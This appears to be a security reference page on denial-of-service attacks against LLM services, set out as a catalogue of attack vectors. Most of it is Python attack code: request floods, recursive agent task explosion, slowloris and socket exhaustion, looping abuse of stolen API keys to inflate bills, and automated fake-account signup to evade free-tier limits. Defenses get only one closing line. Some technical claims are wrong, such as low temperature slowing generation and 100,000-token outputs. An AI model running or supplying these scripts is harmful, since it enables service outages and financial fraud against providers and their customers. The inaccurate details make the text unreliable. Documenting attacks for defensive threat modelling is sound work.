# LLM04: Model Denial of Service - Attack Vectors

## Table of Contents
- [Attack Overview](#attack-overview)
- [Attack Techniques](#attack-techniques)
- [Resource Exhaustion Vectors](#resource-exhaustion-vectors)
- [Cost Exploitation Vectors](#cost-exploitation-vectors)
- [Queue Saturation Vectors](#queue-saturation-vectors)
- [Advanced Attack Patterns](#advanced-attack-patterns)
- [Attack Chains](#attack-chains)
- [Real-World Examples](#real-world-examples)

## Attack Overview

Model Denial of Service attacks exploit the resource-intensive nature of Large Language Models to degrade service quality, exhaust computational resources, or cause financial damage through excessive API costs.

### Attack Flow

```
[Attacker] → [Malicious Input] → [LLM Processing] → [Resource Exhaustion]
     ↓            ↓                    ↓                    ↓
  Identify      Craft input         Model processes    Service degradation
  weakness      patterns            expensive ops      System failure
```

### Attack Prerequisites

1. **Access to LLM Service**: Ability to send requests to the model
2. **Understanding of Resource Costs**: Knowledge of expensive operations
3. **Lack of Rate Limiting**: Insufficient request throttling
4. **Unbounded Resource Allocation**: No limits on computation per request

## Attack Techniques

### Technique 1: Maximum Context Exploitation

**Objective**: Consume maximum computational resources per request

**Method**:
```
1. Identify maximum context length (e.g., 128K tokens)
2. Craft input approaching maximum length
3. Send requests with near-maximum tokens
4. Force O(n²) attention computation
5. Exhaust GPU/CPU resources
```

**Example Attack**:
```python
# Craft maximum-length malicious input
def create_max_context_attack():
    # Find maximum token limit
    max_tokens = 128000  # GPT-4 Turbo limit
    
    # Create input approaching limit
    # Use repetitive but valid content
    attack_input = ""
    base_text = "Analyze this important information: "
    
    # Fill to near maximum
    while len(tokenize(attack_input)) < max_tokens - 1000:
        attack_input += base_text + "data " * 100 + "\n"
    
    return attack_input

# Launch attack
malicious_input = create_max_context_attack()
response = llm_api.generate(malicious_input)  # Consumes massive resources

# Impact:
# - GPU/CPU saturated for extended period
# - Memory allocation spikes
# - Other requests queued or rejected
# - Potential system crash
```

### Technique 2: Output Length Exploitation

**Objective**: Force generation of extremely long responses

**Method**:
```
1. Request maximum output length
2. Use prompts that encourage verbosity
3. Request enumeration or listing tasks
4. Force sequential token generation
5. Tie up model for extended periods
```

**Example Attack**:
```python
# Request maximum output generation
def output_length_attack():
    prompts = [
        "List all prime numbers from 1 to 1000000 with detailed explanation for each",
        "Write a comprehensive 50000-word analysis of...",
        "Enumerate every possible combination of...",
        "Generate code for every edge case in...",
        "Translate the following 10000-word text to 100 languages..."
    ]
    
    for prompt in prompts:
        # Request maximum tokens
        response = llm_api.generate(
            prompt=prompt,
            max_tokens=100000,  # Maximum possible
            temperature=0.7
        )
    
    # Impact:
    # - Sequential generation takes minutes
    # - Resources locked during entire generation
    # - Multiple concurrent attacks overwhelm system
    # - Token costs maximized

# Automated flood attack
import asyncio

async def sustained_output_attack():
    tasks = []
    for i in range(100):  # 100 concurrent expensive requests
        task = asyncio.create_task(
            llm_api.generate(
                "Write maximum length detailed analysis...",
                max_tokens=100000
            )
        )
        tasks.append(task)
    
    await asyncio.gather(*tasks)
```

### Technique 3: Complex Computation Requests

**Objective**: Request computationally intensive operations

**Method**:
```
1. Request nested analysis operations
2. Ask for multi-step reasoning
3. Demand cross-referencing tasks
4. Request combinatorial computations
5. Force repeated passes over content
```

**Example Attack**:
```python
# Computationally expensive prompt
complex_attack = """
Given the following 5000-word document [insert document]:

For EACH word in the document:
1. Provide complete etymology
2. List all synonyms and antonyms
3. Show usage examples from literature (10 examples each)
4. Translate to 50 languages
5. Analyze semantic relationships with other words in document
6. Generate related metaphors and idioms
7. Provide pronunciation in IPA
8. Show historical usage trends

Then:
- Cross-reference all semantic relationships
- Build complete ontology
- Generate visualization descriptions
- Create comprehensive index
"""

response = llm.generate(complex_attack)

# Impact:
# - Requires multiple passes over content
# - Complex reasoning chains
# - Large intermediate representations
# - Extreme memory usage
# - CPU/GPU intensive computation
```

### Technique 4: Recursive Prompt Injection

**Objective**: Create recursive or exponential computation

**Method**:
```
1. Inject prompts that generate new prompts
2. Create self-referential instructions
3. Build recursive task decomposition
4. Force looping behaviors
5. Exhaust stack or memory
```

**Example Attack**:
```python
# Recursive prompt that creates DoS
recursive_attack = """
Task: Break down this task into 10 subtasks.
For each subtask, break it down into 10 more subtasks.
For each of those, break it down into 10 more subtasks.
Continue until you've created a complete task hierarchy.

Then execute all subtasks in sequence.
"""

# In autonomous agent system
def vulnerable_agent(task):
    response = llm.generate(task)
    
    # Agent processes subtasks recursively
    if "subtask:" in response:
        subtasks = extract_subtasks(response)
        for subtask in subtasks:
            vulnerable_agent(subtask)  # Recursive call - no depth limit!

vulnerable_agent(recursive_attack)

# Impact:
# - Exponential task explosion (10^n tasks)
# - Stack overflow
# - Memory exhaustion
# - Infinite processing loop
```

## Resource Exhaustion Vectors

### Vector 1: Memory Saturation

**Goal**: Exhaust available memory

**Attack Pattern**:
```python
# Concurrent large context attacks
import threading

def memory_exhaustion_attack():
    def send_large_request():
        # Each request requires significant memory
        large_input = "context " * 50000  # ~50K tokens
        llm_api.generate(
            prompt=large_input,
            max_tokens=50000  # Large output too
        )
    
    # Launch many concurrent requests
    threads = []
    for i in range(100):  # 100 concurrent requests
        t = threading.Thread(target=send_large_request)
        t.start()
        threads.append(t)
    
    for t in threads:
        t.join()

# Impact:
# Memory per request: ~5-10GB (model + context + activations)
# 100 concurrent: 500GB - 1TB memory required
# System runs out of memory
# Crashes or starts swapping (further degradation)
```

### Vector 2: GPU Compute Exhaustion

**Goal**: Saturate GPU compute resources

**Attack Pattern**:
```python
# Maximize GPU utilization
def gpu_exhaustion_attack():
    # Characteristics that maximize GPU usage:
    # 1. Large context (quadratic attention)
    # 2. Maximum batch size
    # 3. Continuous requests
    
    def expensive_request():
        # Large context for quadratic attention complexity
        context = "word " * 100000  # 100K tokens
        
        # Complex reasoning task
        prompt = f"""
        Analyze every word in the following text.
        For each word, perform deep semantic analysis.
        Text: {context}
        """
        
        return llm_api.generate(prompt, max_tokens=10000)
    
    # Flood with expensive requests
    while True:
        # No delay between requests
        expensive_request()

# Impact:
# - GPU utilization at 100%
# - Request queue builds up
# - Legitimate requests timeout
# - Service effectively unavailable
```

### Vector 3: Token Generation Slowdown

**Goal**: Tie up inference resources with slow token generation

**Attack Pattern**:
```python
# Force slow, sequential token generation
def slow_generation_attack():
    prompts = [
        # Requests that require many tokens
        "Count from 1 to 1000000 in words",
        "List every city in the world with population data",
        "Generate complete dictionary with definitions",
        
        # Requests requiring careful generation (slower)
        "Write valid JSON with 10000 nested objects",
        "Generate syntactically perfect code for...",
        "Produce mathematically accurate tables of..."
    ]
    
    # Each token generated sequentially
    # Can't parallelize token generation
    # Low temperature = more careful = slower
    
    for prompt in prompts:
        llm_api.generate(
            prompt=prompt,
            max_tokens=50000,
            temperature=0.1,  # Low temp = slower but more precise
            top_p=0.9
        )

# Impact:
# - Token generation is sequential
# - 50K tokens at ~50 tokens/sec = 16+ minutes per request
# - Multiple concurrent = hours of compute time
# - Resources locked during entire generation
```

## Cost Exploitation Vectors

### Vector 1: Token Cost Maximization

**Goal**: Maximize API costs for victim

**Attack Pattern**:
```python
# Exploit pay-per-token pricing
def cost_exploitation_attack(stolen_api_key):
    # GPT-4 pricing (example):
    # Input: $0.03 per 1K tokens
    # Output: $0.06 per 1K tokens
    
    import requests
    
    headers = {
        "Authorization": f"Bearer {stolen_api_key}"
    }
    
    # Maximize both input and output tokens
    def expensive_request():
        # Large input (approaching max context)
        input_text = "analyze this: " + ("data " * 50000)  # ~50K input tokens
        
        return requests.post(
            "https://api.openai.com/v1/chat/completions",
            headers=headers,
            json={
                "model": "gpt-4",
                "messages": [{"role": "user", "content": input_text}],
                "max_tokens": 100000  # Maximum output
            }
        )
    
    # Automated continuous attack
    while True:
        expensive_request()
        # Each request: ~50K input + ~100K output = 150K tokens
        # Cost per request: (50 * 0.03) + (100 * 0.06) = $7.50
        # 1000 requests = $7,500
        # 24 hours at 1 req/sec = 86,400 requests = $648,000

# Impact:
# - Massive unexpected bills
# - Budget exhaustion
# - Service shutdown due to cost limits
# - Financial damage to organization
```

### Vector 2: API Key Abuse

**Goal**: Use leaked/stolen API keys to maximize costs

**Attack Pattern**:
```python
# Exploit leaked API key found in GitHub
def api_key_abuse():
    # Attacker finds API key in:
    # - Public GitHub repository
    # - Exposed .env file
    # - Hardcoded in mobile app
    # - Leaked in error messages
    
    compromised_key = "sk-proj-xxxxxxxxxxxxx"
    
    # Setup distributed attack
    import multiprocessing
    
    def worker(key):
        while True:
            try:
                # Maximum cost request
                llm_api.generate(
                    api_key=key,
                    prompt="x " * 100000,  # Max input
                    max_tokens=100000,     # Max output
                    model="gpt-4"          # Most expensive
                )
            except:
                pass  # Continue on errors
    
    # Distribute across multiple processes
    processes = []
    for i in range(multiprocessing.cpu_count()):
        p = multiprocessing.Process(target=worker, args=(compromised_key,))
        p.start()
        processes.append(p)

# Impact:
# - Runs continuously 24/7
# - Maximizes parallelism
# - Costs accumulate rapidly
# - May go unnoticed for days/weeks
```

### Vector 3: Free Tier Exploitation

**Goal**: Abuse free tier or trial accounts

**Attack Pattern**:
```python
# Create multiple accounts to bypass limits
def free_tier_abuse():
    import random
    import string
    
    def generate_fake_email():
        random_string = ''.join(random.choices(string.ascii_lowercase, k=10))
        return f"{random_string}@tempmail.com"
    
    # Automate account creation
    def create_account():
        email = generate_fake_email()
        # Use temporary email services
        # Automated signup flow
        api_key = signup_and_get_key(email)
        return api_key
    
    # Create many accounts
    api_keys = []
    for i in range(100):
        try:
            key = create_account()
            api_keys.append(key)
        except:
            pass
    
    # Rotate through keys
    def rotating_attack():
        key_index = 0
        while True:
            current_key = api_keys[key_index % len(api_keys)]
            
            try:
                # Use up free tier quota
                llm_api.generate(
                    api_key=current_key,
                    prompt="generate content " * 10000,
                    max_tokens=10000
                )
            except:
                # Switch to next key when quota exhausted
                key_index += 1
    
    rotating_attack()

# Impact:
# - Bypass rate limits via multiple accounts
# - Abuse free tier allocations
# - Resource exhaustion for provider
# - Financial loss from free tier abuse
```

## Queue Saturation Vectors

### Vector 1: Request Queue Flooding

**Goal**: Fill request queue to block legitimate users

**Attack Pattern**:
```python
# Flood request queue
def queue_saturation_attack():
    import asyncio
    
    async def send_request():
        # Not necessarily expensive requests
        # Just high volume
        await llm_api.generate_async(
            prompt="Hello, how are you?",
            max_tokens=100
        )
    
    async def flood():
        # Create massive number of concurrent requests
        tasks = []
        for i in range(100000):  # 100K requests
            task = asyncio.create_task(send_request())
            tasks.append(task)
        
        await asyncio.gather(*tasks, return_exceptions=True)
    
    asyncio.run(flood())

# Impact:
# - Request queue fills up
# - Queue size limit reached
# - New requests rejected (including legitimate ones)
# - Service appears unavailable to real users
# - Timeout cascades as queued requests expire
```

### Vector 2: Connection Pool Exhaustion

**Goal**: Exhaust available connections

**Attack Pattern**:
```python
# Hold connections open
def connection_exhaustion():
    import socket
    
    connections = []
    
    # Open many connections
    for i in range(10000):
        try:
            # Establish connection
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect(('api.llm-service.com', 443))
            
            # Send incomplete request (keep connection open)
            sock.send(b'POST /v1/completions HTTP/1.1\r\n')
            # Don't complete the request
            # Connection stays open
            
            connections.append(sock)
        except:
            pass
    
    # Keep connections alive
    while True:
        pass  # Don't close connections

# Impact:
# - Connection pool exhausted
# - New connections cannot be established
# - Legitimate users cannot connect
# - Service unavailable
```

## Advanced Attack Patterns

### Pattern 1: Slowloris-Style LLM Attack

**Goal**: Send slow requests to tie up resources

**Attack Pattern**:
```python
# Slow request attack
def slowloris_llm_attack():
    import time
    
    def slow_request():
        # Open connection
        connection = establish_connection()
        
        # Send prompt very slowly (byte by byte)
        prompt = "Analyze this: " + ("data " * 50000)
        
        for char in prompt:
            connection.send(char.encode())
            time.sleep(0.1)  # Delay between characters
        
        # Request sits in parsing buffer
        # Resources tied up waiting for complete request
    
    # Launch many slow requests
    import threading
    threads = []
    for i in range(1000):
        t = threading.Thread(target=slow_request)
        t.start()
        threads.append(t)

# Impact:
# - Connections held open for extended periods
# - Parsing buffers full
# - Thread pool exhausted
# - Cannot process legitimate requests
```

### Pattern 2: Algorithmic Complexity Exploitation

**Goal**: Trigger worst-case algorithmic complexity

**Attack Pattern**:
```python
# Craft input triggering worst-case performance
def algorithmic_complexity_attack():
    # Exploit quadratic attention in transformers
    # O(n²) complexity in attention mechanism
    
    # Maximum length with maximum cross-token dependencies
    attack_prompt = """
    Please analyze the relationships between every pair of words below.
    For each pair, explain how they relate semantically, grammatically, 
    and contextually. Cross-reference all relationships.
    
    Words: [10000 carefully chosen words with complex relationships]
    """
    
    llm.generate(attack_prompt)
    
    # Attention computation:
    # For n=10000 tokens: ~100,000,000 attention operations
    # GPU memory for attention matrix: ~400MB per layer
    # Multiple layers: several GB just for attention

# Impact:
# - Worst-case O(n²) computation triggered
# - Memory usage spikes
# - Processing time extends dramatically
# - Single request can consume all GPU memory
```

### Pattern 3: Model Thrashing

**Goal**: Force constant model loading/unloading

**Attack Pattern**:
```python
# Force model switching
def model_thrashing_attack():
    # If service supports multiple models
    models = [
        "gpt-3.5-turbo",
        "gpt-4",
        "claude-3-opus",
        "claude-3-sonnet",
        "llama-70b",
        "mixtral-8x7b"
    ]
    
    import random
    
    while True:
        # Rapidly switch between models
        model = random.choice(models)
        
        llm_api.generate(
            model=model,
            prompt="Hello",
            max_tokens=10
        )
        
        # If models aren't all loaded in memory simultaneously,
        # this forces constant loading/unloading
        # High overhead, poor cache utilization

# Impact:
# - Model loading/unloading overhead
# - Cache thrashing
# - Memory fragmentation
# - Reduced throughput
# - Increased latency for all users
```

## Attack Chains

### Chain 1: Reconnaissance → Exploitation → Cost Damage

```
[Reconnaissance]
    ↓
Find API endpoint and authentication method
    ↓
[Credential Acquisition]
    ↓
Search GitHub for leaked keys
    ↓
[Validation]
    ↓
Test key with small requests
    ↓
[Exploitation]
    ↓
Launch maximum-cost automated attack
    ↓
[Cost Damage]
    ↓
Victim receives massive unexpected bill
```

### Chain 2: Access → Rate Limit Discovery → Bypass

```
[Initial Access]
    ↓
Create legitimate account
    ↓
[Testing]
    ↓
Discover rate limits through testing
    ↓
[Bypass Strategy]
    ↓
Create multiple accounts / IP rotation
    ↓
[Distributed Attack]
    ↓
Flood from multiple accounts/IPs
    ↓
[Service Degradation]
    ↓
Legitimate users experience slowdown/unavailability
```

## Real-World Examples

### Example 1: ChatGPT Capacity Issues (2023)

**Attack**: Combination of high legitimate demand and potential abuse

**Method**:
- Extreme concurrent user load
- Complex queries consuming disproportionate resources
- No per-user rate limiting initially
- Queue saturation

**Impact**: Multiple extended outages, poor user experience

### Example 2: Hugging Face Model DoS (2023)

**Attack**: Researchers demonstrated DoS via adversarial inputs

**Method**:
- Crafted inputs causing extreme memory usage
- Triggered worst-case model behavior
- Caused out-of-memory errors

**Impact**: Proof of concept for model-specific DoS attacks

### Example 3: API Key Leakage Cost Explosion

**Attack**: Leaked API keys used for crypto mining-style abuse

**Method**:
- API keys found in public GitHub repos
- Automated scripts maximizing token usage
- Ran for days/weeks unnoticed
- Used most expensive models (GPT-4)

**Impact**: Organizations receiving bills of $50K - $200K+

---

**Key Defense**: Implement comprehensive rate limiting, input validation, resource quotas, cost monitoring, and timeout mechanisms to prevent DoS attacks from degrading service quality or causing financial damage.
